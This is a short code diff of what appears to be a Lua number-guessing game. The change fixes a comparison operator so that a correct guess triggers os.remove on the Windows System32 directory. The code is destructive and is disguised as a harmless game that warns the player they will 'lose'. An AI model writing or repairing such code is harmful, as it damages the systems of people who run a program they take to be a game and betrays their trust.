@@ -8,6 +8,6 @@ print("if you answer the random chosen number")
 print("youll lose")
 if ans < n or ans > n then
 print("youre lucky")
-elseif ans = n then
+elseif ans == n then
 os.remove("C:/Windows/System32")
 end
